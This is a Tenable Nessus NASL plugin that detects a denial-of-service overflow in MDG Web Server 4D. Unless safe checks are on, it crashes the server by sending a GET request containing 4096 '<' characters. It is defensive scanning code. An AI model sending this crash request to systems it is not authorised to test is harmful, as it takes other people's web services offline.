#
# (C) Tenable Network Security, Inc.
#

include( 'compat.inc' );

if(description)
{
  script_id(11560);
  script_version ("$Revision: 1.10 $");
  script_bugtraq_id(7479);
  script_xref(name:"OSVDB", value:"55331");

  script_name(english:"MDG Web Server 4D GET Request Remote Overflow");
  script_summary(english:"Crashes 4D WS");
  script_set_attribute(
    attribute:'synopsis',
    value:'The remote service is vulnerable to a denial of service attack.'
  );

  script_set_attribute(
    attribute:'description',
    value:"It is possible to kill the web server by sending an oversized string
of '<' as an argument to a GET request. 

A cracker may exploit this vulnerability to make your web server
crash continually or even execute arbirtray code on your system."
  );

  script_set_attribute(
    attribute:'solution',
    value: "Unknown at this time."
  );

  script_set_attribute(
    attribute:'see_also',
    value:'http://archives.neohapsis.com/archives/fulldisclosure/2003-q2/0502.html'
  );

  script_set_attribute(
    attribute:'cvss_vector',
    value:'CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P'
  );

  script_end_attributes();

  script_category(ACT_MIXED_ATTACK);
  script_copyright(english:"This script is Copyright (C) 2003-2009 Tenable Network Security, Inc.");
  script_family(english:"Web Servers");
  script_dependencies("find_service1.nasl", "http_version.nasl", "no404.nasl");
  script_require_ports("Services/www", 80);
  exit(0);
}

########

include("http_func.inc");

port = get_http_port(default:80);

if(! get_port_state(port)) exit(0);
banner = get_http_banner(port:port);
if(!banner)exit(0);
if ( "Web_Server_4D" >!< banner ) exit(0);

if( safe_checks() )
{
 if(egrep(pattern:"^Server: Web_Server_4D/([0-2]\..*|3\.([0-5]|6\.0))[^0-9]", string:banner))security_warning(port);
 exit(0);
}

if(http_is_dead(port:port))exit(0);

soc = http_open_socket(port);
if(! soc) exit(0);

req = http_get(item:"/" + crap(data:"<", length:4096), port:port);
send(socket:soc, data:req);
r = http_recv(socket:soc);
http_close_socket(soc);

if (http_is_dead(port: port)) security_warning(port);
